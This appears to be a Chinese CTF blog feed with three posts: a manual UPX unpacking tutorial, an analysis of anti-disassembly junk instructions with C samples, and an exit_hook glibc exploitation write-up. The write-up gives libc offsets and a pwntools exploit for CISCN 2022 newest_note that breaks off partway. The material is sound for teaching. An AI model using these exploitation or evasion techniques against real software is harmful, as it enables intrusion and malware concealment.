    <content type="html"><![CDATA[<h1 id="手脱UPX壳不求人教程"><a href="#手脱UPX壳不求人教程" class="headerlink" title="手脱UPX壳不求人教程"></a>手脱UPX壳不求人教程</h1><p>小白：“为什么要手脱UPX壳呀？upx -d　不香吗？”<br>高手：“香个蛋，出题人各个心里阴暗，能给你upx -d的机会不多了。”</p><h2 id="ESP定律"><a href="#ESP定律" class="headerlink" title="ESP定律"></a>ESP定律</h2><p>个人认为这个方法是最方便，最快捷的，掌握这个方法基本的UPX壳闭眼脱</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>ESP 定律的原理在于利用程序中堆栈平衡来快速找到 OEP.</p><p>由于在程序自解密或者自解压过程中, 不少壳会先将当前寄存器状态压栈, 如使用<code>pushad</code>, 在解压结束后, 会将之前的寄存器值出栈, 如使用<code>popad</code>. 因此在寄存器出栈时, 往往程序代码被恢复, 此时硬件断点触发. 然后在程序当前位置, 只需要少许单步操作, 就很容易到达正确的 OEP 位置.</p><ol><li>程序刚载入开始 pushad&#x2F;pushfd</li><li>将第一个寄存器压入栈后就设对 ESP 寄存器设硬件断点</li><li>运行程序, 触发断点，这是upx程序几乎结束</li></ol><h3 id="例题讲解"><a href="#例题讲解" class="headerlink" title="例题讲解"></a>例题讲解</h3><p>ida反编译一个加upx壳的发现函数很少，但是可以发现，start函数开始有很多push操作</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250115225432603.png" alt="image-20250115225432603"></p><p>打开x64dbg进行调试，指向到第二个push停止</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250115225742755.png" alt="image-20250115225742755"></p><p>然后再右下栈窗口给esp下硬件访问断点，64位8字节，32位4字节</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250115225858495.png" alt="image-20250115225858495"></p><p>接下来直接运行，就会断在upx壳快结束的位置</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250115230107554.png" alt="image-20250115230107554"></p><p>接着一直往下运行，直到一个大的跳转，就是到达OEP</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250115230300395.png" alt="image-20250115230300395"></p><p>到达OEP后就用x64dbg自带的插件进行dump和IAT的修复</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250115230506018.png" alt="image-20250115230506018"></p><p>在第四步的时候，如果出现红色×就删除掉</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250115230603184.png" alt="image-20250115230603184"></p><p>上边步骤已经完成了dump和IAT的修复，但是可能程序仍然不能运行</p><p>这时候我们就要去除重定位</p><p>我们需要修改其PE结构中的两个字段值：</p><ol><li>File Header 的 Charateristics</li><li>Optional Header的 DllCharateristics</li></ol><p>下面用小辣椒(CFF Explorer VII)进行修复</p><p>第三步勾选上</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250115231709951.png" alt="image-20250115231709951"></p><p>第三步取消勾选</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250115231854920.png" alt="image-20250115231854920"></p><p>这样一个完整的脱壳流程就完成了</p><p>可能需要自己找到main函数😭</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250115232224281.png" alt="image-20250115232224281"></p><blockquote><p>其他脱壳方法待补充。。。。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Reverse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>手脱UPX壳</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>花指令透彻分析</title>
    <link href="/2025/01/15/%E8%8A%B1%E6%8C%87%E4%BB%A4%E9%80%8F%E5%BD%BB%E5%88%86%E6%9E%90/"/>
    <url>/2025/01/15/%E8%8A%B1%E6%8C%87%E4%BB%A4%E9%80%8F%E5%BD%BB%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="花指令透彻分析"><a href="#花指令透彻分析" class="headerlink" title="花指令透彻分析"></a>花指令透彻分析</h1><h2 id="0x01-花指令介绍"><a href="#0x01-花指令介绍" class="headerlink" title="0x01 花指令介绍"></a>0x01 花指令介绍</h2><p>花指令实质就是一串垃圾指令，它与程序本身的功能无关，并不影响程序本身的逻辑。在软件保护中花指令被作为一种手段来增加<strong>静态分析</strong>的难度，花指令也可以被用在病毒或木马上，通过加入花指令改变程序的特征码，躲避杀软的扫描，从而达到免杀的目的。花指令一般被分为两类：会被执行的和不会被执行的（垃圾指令）。</p><h2 id="0x02-会被执行花指令"><a href="#0x02-会被执行花指令" class="headerlink" title="0x02 会被执行花指令"></a>0x02 会被执行花指令</h2><p>这类花指令本身是正常的汇编指令，它们运行完后不会改变原来程序的堆栈&#x2F;寄存器，但能起到干扰静态分析的作用。一般分为两种：</p><ul><li>形式一：改变堆栈操作</li><li>形式二：利用call或者jmp指令增加执行流复杂度</li></ul><h3 id="形式一"><a href="#形式一" class="headerlink" title="形式一"></a>形式一</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    __asm__(<br>        <span class="hljs-string">&quot;push %eax\n&quot;</span><br>        <span class="hljs-string">&quot;add $4, %esp&quot;</span><br>    );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;P0ach1l\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>用32位编译一下，正常来说应该ida识别不出来，但是不知道什么情况，我的ida就能识别出来，暂且不管。</p><h3 id="形式二"><a href="#形式二" class="headerlink" title="形式二"></a>形式二</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>执行call执行时会向堆栈中压入<strong>返回地址</strong>，我们可以修改这个<strong>返回地址</strong>，配合ret指令跳转到<strong>任意</strong>一个想去的地方。</p><p>示例代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    __asm__ (<br>        <span class="hljs-string">&quot;call xxx\n&quot;</span>              <span class="hljs-comment">// 调用 xxx 标签</span><br>    <span class="hljs-string">&quot;xxx:\n&quot;</span><br>        <span class="hljs-string">&quot;add $0x7, (%esp)\n&quot;</span>      <span class="hljs-comment">// 在栈顶加上 0x7</span><br>        <span class="hljs-string">&quot;ret\n&quot;</span>                  <span class="hljs-comment">// 返回</span><br>        <span class="hljs-string">&quot;nop\n&quot;</span>                    <span class="hljs-comment">// 空操作，占 1 字节</span><br>        <span class="hljs-string">&quot;nop\n&quot;</span>                    <span class="hljs-comment">// 空操作，占 1 字节</span><br>        <span class="hljs-string">&quot;nop\n&quot;</span>                    <span class="hljs-comment">// 空操作，占 1 字节</span><br>        <span class="hljs-string">&quot;nop\n&quot;</span>                    <span class="hljs-comment">// 空操作，占 1 字节</span><br>        <span class="hljs-string">&quot;nop\n&quot;</span>                    <span class="hljs-comment">// 空操作，占 1 字节</span><br>        <span class="hljs-string">&quot;nop\n&quot;</span> <br>    );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello World!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>32位编译一下，然后我们运行一下，看有没有问题，结果很显然，非常正常</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250115215537192.png" alt="image-20250115215537192"></p><p>用ida反编译一下，看看花指令到底影响我们的ida识别没有</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250115215636631.png" alt="image-20250115215636631"></p><p>直接飘红，F5后给出无效反编译代码</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250115215722649.png" alt="image-20250115215722649"></p><p>ida认为到第一个ret就结束main函数了</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250115215825151.png" alt="image-20250115215825151"></p><h4 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h4><p>我们就根据add指令把esp指向的地址加几个字节，我们就nop几个字节，然后Edit function改一下函数结束地址就修复成功了</p><h2 id="0x03-不会被执行花指令"><a href="#0x03-不会被执行花指令" class="headerlink" title="0x03 不会被执行花指令"></a>0x03 不会被执行花指令</h2><p>花指令虽然被插入到了正常代码的中间，但是并不意味着它一定会得到执行。这类花指令一般不属于CPU可以识别的操作码，那么就需要在上面用跳转跳过这些花指令才能保证程序的正常运行</p><h3 id="形式一-1"><a href="#形式一-1" class="headerlink" title="形式一"></a>形式一</h3><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>如果我们插入的花指令是一个操作码，那么后面程序原本的机器码就会被误认为是这个操作码的操作数，从而导致反汇编引擎的解析错误。</p><p>示例代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    __asm__ (<br>        <span class="hljs-string">&quot;xor %eax, %eax\n&quot;</span>           <span class="hljs-comment">// XOR eax, eax</span><br>        <span class="hljs-string">&quot;jz xxx\n&quot;</span>                   <span class="hljs-comment">// 跳转到 xxx 标签（如果 eax 为 0）</span><br>        <span class="hljs-string">&quot;.byte 0x11\n&quot;</span><br>        <span class="hljs-string">&quot;.byte 0x22\n&quot;</span><br>        <span class="hljs-string">&quot;.byte 0x33\n&quot;</span>                 <span class="hljs-comment">// 插入字节 0x33</span><br>    <span class="hljs-string">&quot;xxx:\n&quot;</span><br>    );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;P0ach1l&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>由于经过xoreax，eax后，ZF标志位被置为1，那么jz这条跳转指令必定会被执行，后面插入的0x11,0x22,0x33就会被跳过，程序正常运行。</p><p>ida反编译效果</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250115222646010.png" alt="image-20250115222646010"></p><h4 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h4><p>只需要把跳转中间不会被执行的指令nop掉就行了</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250115223038950.png" alt="image-20250115223038950"></p><h3 id="形式二-1"><a href="#形式二-1" class="headerlink" title="形式二"></a>形式二</h3><h4 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h4><p>插入的花指令也可以是改变堆栈平衡的汇编代码，跟形式一相同，在这些花指令上面写上跳转指令，虽然花指令不会被执行，但是IDA进行解析时会认为该函数堆栈不平衡，从而使F5功能失效。</p><p>示例代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    __asm__ (<br>        <span class="hljs-string">&quot;xor %eax, %eax\n&quot;</span><br>        <span class="hljs-string">&quot;jz s\n&quot;</span><br>        <span class="hljs-string">&quot;add $0x11, %esp\n&quot;</span><br>    <span class="hljs-string">&quot;s:\n&quot;</span><br>    );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;P0ach1l\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ida反编译效果</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250115223535266.png" alt="image-20250115223535266"></p><h4 id="修复-2"><a href="#修复-2" class="headerlink" title="修复"></a>修复</h4><p>类似于形式一，把中间跳过的字节nop掉就行</p>]]></content>
    
    
    <categories>
      
      <category>Reverse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>花指令</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>exit_hook相关利用</title>
    <link href="/2024/12/10/exit-hook%E7%9B%B8%E5%85%B3%E5%88%A9%E7%94%A8/"/>
    <url>/2024/12/10/exit-hook%E7%9B%B8%E5%85%B3%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="exit-hook相关利用"><a href="#exit-hook相关利用" class="headerlink" title="exit_hook相关利用"></a>exit_hook相关利用</h1><h2 id="glibc2-34之前"><a href="#glibc2-34之前" class="headerlink" title="glibc2.34之前"></a>glibc2.34之前</h2><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件:"></a><strong>利用条件:</strong></h3><blockquote><ul><li>至少有一次任意写</li><li>程序可以结束(可显式触发<code>exit</code>函数 或 主函数由<code>libc_start_main</code>启动且可正常退出)，调用到<code>_dl_fini</code> 函数</li></ul></blockquote><p>写个简单调试代码   ， 来看看exit是怎么工作的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>首先进入__run_exit_handlers</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202412101909876.png" alt="image-20241210190959738"></p><p>这里会调用到**_dl_fini函数** ，进入：</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202412101912407.png" alt="image-20241210191211314"></p><p>_dl_fini函数开头的for循环中就调用到了<strong>rtld_lock_default_lock_recursive函数</strong> ，可以看到该函数的地址是直接通过*(rip + 偏移)拿到的：</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202412101922330.png" alt="image-20241210192203250"></p><p>来看一下_dl_fini源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br>_dl_fini (<span class="hljs-type">void</span>)<br>&#123;<br>  <span class="hljs-comment">/* Lots of fun ahead.  We have to call the destructors for all still</span><br><span class="hljs-comment">     loaded objects, in all namespaces.  The problem is that the ELF</span><br><span class="hljs-comment">     specification now demands that dependencies between the modules</span><br><span class="hljs-comment">     are taken into account.  I.e., the destructor for a module is</span><br><span class="hljs-comment">     called before the ones for any of its dependencies.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">     To make things more complicated, we cannot simply use the reverse</span><br><span class="hljs-comment">     order of the constructors.  Since the user might have loaded objects</span><br><span class="hljs-comment">     using `dlopen&#x27; there are possibly several other modules with its</span><br><span class="hljs-comment">     dependencies to be taken into account.  Therefore we have to start</span><br><span class="hljs-comment">     determining the order of the modules once again from the beginning.  */</span><br><br>  <span class="hljs-comment">/* We run the destructors of the main namespaces last.  As for the</span><br><span class="hljs-comment">     other namespaces, we pick run the destructors in them in reverse</span><br><span class="hljs-comment">     order of the namespace ID.  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> SHARED</span><br>  <span class="hljs-type">int</span> do_audit = <span class="hljs-number">0</span>;<br> again:<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  <span class="hljs-keyword">for</span> (Lmid_t ns = GL(dl_nns) - <span class="hljs-number">1</span>; ns &gt;= <span class="hljs-number">0</span>; --ns)<br>    &#123;<br>      <span class="hljs-comment">/* Protect against concurrent loads and unloads.  */</span><br>      __rtld_lock_lock_recursive (GL(dl_load_lock)); <span class="hljs-comment">// 这里直接调用没有判断条件</span><br><br>      <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nloaded = GL(dl_ns)[ns]._ns_nloaded;<br>      <span class="hljs-comment">/* No need to do anything for empty namespaces or those used for</span><br><span class="hljs-comment"> auditing DSOs.  */</span><br>      <span class="hljs-keyword">if</span> (nloaded == <span class="hljs-number">0</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> SHARED</span><br>  || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  )<br>__rtld_lock_unlock_recursive (GL(dl_load_lock)); <span class="hljs-comment">// 这里有一个if判断条件通过才能调用</span><br>      <span class="hljs-keyword">else</span><br>&#123;<br>  <span class="hljs-comment">/* Now we can allocate an array to hold all the pointers and</span><br><span class="hljs-comment">     copy the pointers in.  */</span><br>  <span class="hljs-keyword">struct</span> link_map *maps[nloaded];<br><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">l</span>;</span><br>  assert (nloaded != <span class="hljs-number">0</span> || GL(dl_ns)[ns]._ns_loaded == <span class="hljs-literal">NULL</span>);<br>  <span class="hljs-keyword">for</span> (l = GL(dl_ns)[ns]._ns_loaded, i = <span class="hljs-number">0</span>; l != <span class="hljs-literal">NULL</span>; l = l-&gt;l_next)<br>    <span class="hljs-comment">/* Do not handle ld.so in secondary namespaces.  */</span><br>    <span class="hljs-keyword">if</span> (l == l-&gt;l_real)<br>      &#123;<br>assert (i &lt; nloaded);<br><br>maps[i] = l;<br>l-&gt;l_idx = i;<br>++i;<br><br><span class="hljs-comment">/* Bump l_direct_opencount of all objects so that they</span><br><span class="hljs-comment">   are not dlclose()ed from underneath us.  */</span><br>++l-&gt;l_direct_opencount;<br>      &#125;<br>  assert (ns != LM_ID_BASE || i == nloaded);<br>  assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class="hljs-number">1</span>);<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nmaps = i;<br><br>  <span class="hljs-comment">/* Now we have to do the sorting.  We can skip looking for the</span><br><span class="hljs-comment">     binary itself which is at the front of the search list for</span><br><span class="hljs-comment">     the main namespace.  */</span><br>  _dl_sort_maps (maps + (ns == LM_ID_BASE), nmaps - (ns == LM_ID_BASE),<br> <span class="hljs-literal">NULL</span>, <span class="hljs-literal">true</span>);<br><br>  <span class="hljs-comment">/* We do not rely on the linked list of loaded object anymore</span><br><span class="hljs-comment">     from this point on.  We have our own list here (maps).  The</span><br><span class="hljs-comment">     various members of this list cannot vanish since the open</span><br><span class="hljs-comment">     count is too high and will be decremented in this loop.  So</span><br><span class="hljs-comment">     we release the lock so that some code which might be called</span><br><span class="hljs-comment">     from a destructor can directly or indirectly access the</span><br><span class="hljs-comment">     lock.  */</span><br>  __rtld_lock_unlock_recursive (GL(dl_load_lock)); <span class="hljs-comment">// 这里在else里面也有调用</span><br>          ·······<br>      &#125;<br><br></code></pre></td></tr></table></figure><p>综上，只需要覆盖__rtld_lock_lock_recursive 和 _rtld_lock_unlock_recursive其中一个为one_gadget即可getshell，这rdi寄存器的值我们控制不了，除非能申请到chunk，然后往 _rtld_local+2440上面写”&#x2F;bin&#x2F;sh”的地址，否则就只能打one_gadget。</p><p>下面是一些偏移比赛时可以直接使用</p><p><strong>在libc-2.23中</strong><br><strong>exit_hook &#x3D; libc_base+0x5f0040+3848</strong></p><p><strong>exit_hook &#x3D; libc_base+0x5f0040+3856</strong></p><p><strong>在libc-2.27中</strong></p><p><strong>exit_hook &#x3D; libc_base+0x619060+3840</strong></p><p><strong>exit_hook &#x3D; libc_base+0x619060+3848</strong></p><p>这样一来，只要知道libc版本和任意地址的写，我们可以直接写这个指针，执行exit后就可以拿到shell了，不执行也可以正常结束也会返回这个</p><h2 id="glibc2-34"><a href="#glibc2-34" class="headerlink" title="glibc2.34"></a>glibc2.34</h2><p>在glibc2.34中exit_hook比较难找，相对libc基地址的偏移的</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202412101940990.png" alt="image-20241210194035898"></p><h2 id="CISCN-2022-初赛-newest-note-NSSCTF"><a href="#CISCN-2022-初赛-newest-note-NSSCTF" class="headerlink" title="[CISCN 2022 初赛]newest_note | NSSCTF"></a>[<a href="https://www.nssctf.cn/problem/2351">CISCN 2022 初赛]newest_note | NSSCTF</a></h2><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol><li>利用开始可控制大小，申请一个大于TopChunk大小的chunk，系统会调用mmap 分配，会映射libc地址开辟大小，就可以泄露libc地址</li><li>利用fastbin 进行 double free ， 申请到exit_hook位置的chunk ， 用one_gadget</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br>ls      = <span class="hljs-keyword">lambda</span> data    :log.success(data)<br>lss     = <span class="hljs-keyword">lambda</span> s       :ls(<span class="hljs-string">&#x27;\033[1;31;40m%s ---&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br><br>filename = <span class="hljs-string">&#x27;./newest_note&#x27;</span><br>url = <span class="hljs-string">&#x27;node4.anna.nssctf.cn:28339&#x27;</span><br><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>, <span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;80&#x27;</span>]<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;([^:\s]+)(?::(\d+)|\s+(\d+))?&#x27;</span>, url)<br>hostname, port = (<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>), <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">3</span>)) <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">else</span> (<span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>)<br>p = (remote(hostname, port) <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;re&#x27;</span> <span class="hljs-keyword">else</span> process(filename))<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;de&#x27;</span>:<br>    gdbscript = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    b * main</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    gdb.attach(p, gdbscript=gdbscript)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;GDB attached successfully&quot;</span>)    <br>elf = ELF(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;:&#x27;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span 